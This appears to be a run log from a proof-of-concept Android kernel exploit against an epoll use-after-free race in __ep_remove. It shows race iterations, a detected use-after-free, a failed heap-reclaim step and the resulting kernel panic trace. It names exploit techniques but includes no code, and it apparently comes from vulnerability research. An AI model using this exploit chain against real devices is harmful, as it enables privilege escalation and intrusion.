=========================================================
=== HYP-013: Unassisted End-to-End E2E Exploit (PoC) ===
=========================================================
[    1.434028][   T56] request_module fs-devtmpfs succeeded, but still no fs?
[+] Privileges dropped to uid=2000. Commencing unassisted exploit...
[+] Timerfd interrupt widening queue configured.
[*] Starting N=150000 natural two-stage race iterations...
[*] Completed 1000 / 150000 iterations...
[*] Completed 2000 / 150000 iterations...
[*] Completed 3000 / 150000 iterations...
[*] Completed 4000 / 150000 iterations...
[*] Completed 5000 / 150000 iterations...
[  165.013487][   T59] epoll_uaf: UAF DETECTED in __ep_remove! inner_ep=ffffff80045666c0 freed before hlist_del_rcu
[+] NATURAL RACE HIT! Iteration 5669. Executing victim sandwich drain...
[*] Slab drain complete: -1 -> -1 slabs.
[-] AAR Oracle Miss. Reclaim failed. Cleaning up for retry...
[  173.140301][   T56] Unable to handle kernel read from unreadable memory at virtual address 0000000000000000
[  173.140942][   T56] Mem abort info:
[  173.141204][   T56]   ESR = 0x0000000096000005
[  173.141525][   T56]   EC = 0x25: DABT (current EL), IL = 32 bits
[  173.141847][   T56]   SET = 0, FnV = 0
[  173.142082][   T56]   EA = 0, S1PTW = 0
[  173.142570][   T56]   FSC = 0x05: level 1 translation fault
[  173.142900][   T56] Data abort info:
[  173.143139][   T56]   ISV = 0, ISS = 0x00000005
[  173.143402][   T56]   CM = 0, WnR = 0
[  173.143713][   T56] user pgtable: 4k pages, 39-bit VAs, pgdp=0000000043f68000
[  173.144112][   T56] [0000000000000000] pgd=0000000000000000, p4d=0000000000000000, pud=0000000000000000
[  173.145028][   T56] Internal error: Oops: 0000000096000005 [#1] PREEMPT SMP
[  173.145753][   T56] Modules linked in:
[  173.146246][   T56] CPU: 1 PID: 56 Comm: harness Not tainted 6.1.23-android14-4-maybe-dirty #1
[  173.146787][   T56] Hardware name: linux,dummy-virt (DT)
[  173.147340][   T56] pstate: 80400005 (Nzcv daif +PAN -UAO -TCO -DIT -SSBS BTYPE=--)
[  173.147782][   T56] pc : __ep_remove+0xe8/0x3d8
[  173.148192][   T56] lr : __ep_remove+0xc8/0x3d8
[  173.148451][   T56] sp : ffffffc009cdbc90
[  173.148657][   T56] x29: ffffffc009cdbc90 x28: 00000000000000c0 x27: 0000000000000020
[  173.149139][   T56] x26: 0000000000000000 x25: 0000000000000000 x24: 0000000000080007
[  173.149496][   T56] x23: 0000000000000000 x22: ffffff8004565030 x21: ffffff8004565000
[  173.149854][   T56] x20: ffffff8004567300 x19: ffffff8004566780 x18: ffffffc009cd3048
[  173.150255][   T56] x17: 000000008f07ca55 x16: 000000008f07ca55 x15: 0000000000000007
[  173.150626][   T56] x14: 000000000000003e x13: 0000000000000001 x12: a08e560480ffffff
[  173.150962][   T56] x11: 0000000000000000 x10: 0000000000000001 x9 : ffffff8004567350
[  173.151434][   T56] x8 : 0000000000000000 x7 : 0000000000000000 x6 : 0000000000000000
[  173.151778][   T56] x5 : ffffff8002058f90 x4 : ffffff807fbcae00 x3 : 00000000000e4e41
[  173.152206][   T56] x2 : 0000000000000000 x1 : 0000000000000000 x0 : ffffff8004565030
[  173.152706][   T56] Call trace:
[  173.152930][   T56]  __ep_remove+0xe8/0x3d8
[  173.153279][   T56]  ep_clear_and_put+0xd0/0x1dc
[  173.153514][   T56]  ep_eventpoll_release+0x20/0x38
[  173.153742][   T56]  __fput+0xfc/0x2dc
[  173.153936][   T56]  ____fput+0x18/0x2c
[  173.154173][   T56]  task_work_run+0xd8/0x104
[  173.154416][   T56]  do_notify_resume+0x294/0x340
[  173.154635][   T56]  el0_svc+0x68/0xc4
[  173.154827][   T56]  el0t_64_sync_handler+0x8c/0xfc
[  173.155161][   T56]  el0t_64_sync+0x1a0/0x1a4
[  173.155743][   T56] Code: 9430e64e 1400008e f9406ab7 91014289 (f94002e8) 
[  173.156338][   T56] ---[ end trace 0000000000000000 ]---
[  173.156875][   T56] Kernel panic - not syncing: Oops: Fatal exception
[  173.157357][   T56] SMP: stopping secondary CPUs
[  173.158288][   T56] Kernel Offset: disabled
[  173.158489][   T56] CPU features: 0x22000,2023c080,0000421b
[  173.158918][   T56] Memory Limit: none
